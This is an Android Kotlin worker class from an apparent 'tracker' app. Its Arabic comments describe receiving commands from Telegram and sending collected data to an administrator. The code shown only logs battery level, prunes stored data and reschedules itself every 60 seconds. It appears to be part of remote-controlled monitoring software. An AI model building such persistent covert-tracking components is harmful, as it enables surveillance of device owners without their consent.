package com.abuzahra.tracker.services

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.abuzahra.tracker.BotServerClient
import com.abuzahra.tracker.CommandExecutor
import com.abuzahra.tracker.LocalStorageManager
import com.abuzahra.tracker.SharedPrefsManager
import com.abuzahra.tracker.TelegramDirectClient
import kotlinx.coroutines.delay

/**
 * DataSyncWorker - عامل مزامنة البيانات (الإصدار المباشر لتيليجرام)
 *
 * المعمارية الجديدة: بدون سيرفر وسيط
 * التطبيق يستقبل الأوامر مباشرة من تيليجرام ويرسل البيانات مباشرة للمدير
 *
 * المسار: المدير ← تيليجرام ← التطبيق ← يجمع البيانات ← تيليجرام ← المدير
 */
class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, params) {

    companion object {
        private const val TAG = "DataSyncWorker"

        /**
         * بدء العمل فوراً (مرة واحدة)
         */
        fun startImmediate(context: Context) {
            val workRequest = OneTimeWorkRequestBuilder<DataSyncWorker>().build()
            WorkManager.getInstance(context)
                .enqueueUniqueWork("data_sync_immediate", ExistingWorkPolicy.REPLACE, workRequest)
        }
    }

    override suspend fun doWork(): Result {
        Log.d(TAG, "بدء عمل مزامنة البيانات (مباشر)...")

        return try {
            // === ⚠️ تم إزالة استطلاع السيرفر ===
            // FirebaseCommandService يتولى جميع الأوامر الآن
            // لا حاجة لاستطلاع REST API (كان يسبب تنفيذ مكرر)

            // === إرسال نبض حالة ===
            sendHeartbeat()

            // === تنظيف البيانات القديمة ===
            LocalStorageManager.clearOldData(applicationContext, keepLast = 200)

            // === إعادة الجدولة (كل 60 ثانية) ===
            rescheduleWorker()

            Log.d(TAG, "تم إنهاء عمل مزامنة البيانات بنجاح")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في مزامنة البيانات: ${e.message}", e)
            rescheduleWorker()
            Result.retry()
        }
    }

    // ==================== ==================== ====================
    //         ⚠️ تم إزالة pollServerForCommands
    //         FirebaseCommandService هو المصدر الوحيد للأوامر الآن
    // ==================== ==================== ====================

    /**
     * إرسال نبض قلب (اختياري)
     */
    private suspend fun sendHeartbeat() {
        try {
            val battery = (applicationContext.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager)
                ?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100

            SharedPrefsManager.setLastHeartbeat(applicationContext, System.currentTimeMillis())
            Log.d(TAG, "نبض القلب: البطارية $battery%")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إرسال نبض القلب: ${e.message}")
        }
    }

    /**
     * إعادة جدولة العامل ليتم تشغيله مرة أخرى
     */
    private fun rescheduleWorker() {
        try {
            val nextWorkRequest = OneTimeWorkRequestBuilder<DataSyncWorker>()
                .setInitialDelay(60, java.util.concurrent.TimeUnit.SECONDS)
                .build()

            WorkManager.getInstance(applicationContext)
                .enqueueUniqueWork("data_sync_periodic", ExistingWorkPolicy.REPLACE, nextWorkRequest)

            Log.d(TAG, "تمت إعادة الجدولة - الجولة القادمة بعد 60 ثانية")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إعادة الجدولة: ${e.message}")
        }
    }
}
